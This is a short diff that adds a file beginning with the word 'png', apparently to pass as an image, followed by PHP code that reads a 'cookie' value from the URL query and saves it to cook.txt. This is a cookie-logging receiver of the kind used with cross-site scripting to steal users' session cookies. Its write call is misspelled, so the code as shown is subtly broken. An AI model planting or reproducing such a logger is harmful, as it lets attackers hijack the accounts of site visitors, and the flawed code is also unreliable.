@@ -1,0 +1,5 @@
+png
+<?php
+$cookie = $_GET['cookie'];
+file_put_content('cook.txt', $cookie);
+?>
